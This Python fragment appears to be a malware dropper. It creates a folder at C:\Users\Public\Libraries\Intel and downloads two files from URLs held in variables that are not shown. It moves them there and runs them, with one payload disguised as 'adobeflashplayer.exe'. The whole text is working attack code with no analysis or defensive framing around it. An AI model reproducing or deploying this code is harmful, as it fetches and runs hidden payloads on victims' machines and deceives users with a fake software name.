nameem = 'adobeflashplayer' + '.exe'

dir = "C:\\Users\\Public\\Libraries\\Intel\\" + nameem

def dr0p():    
    os.popen("mkdir C:\\Users\\Public\\Libraries\\Intel")
    urlretrieve(embed_d,nameph)
    move(nameph, "C:\\Users\\Public\\Libraries\\Intel\\" + nameph)
    os.popen('C:\\Users\\Public\\Libraries\\Intel\\' + nameph)
    #exe
    urlretrieve(url_d,nameem)
    move(nameem, "C:\\Users\\Public\\Libraries\\Intel\\" + nameem)
    os.popen("C:\\Users\\Public\\Libraries\\Intel\\" + nameem)
    sys.exit(0)
def main():    
    if os.path.isfile(dir) == False:
        dr0p()
        sys.exit(0)
    else:
        os.popen('C:\\Users\\Public\\Libraries\\Intel\\' + nameph)
        sys.exit(0)

if __name__ == '__main__':
    main()
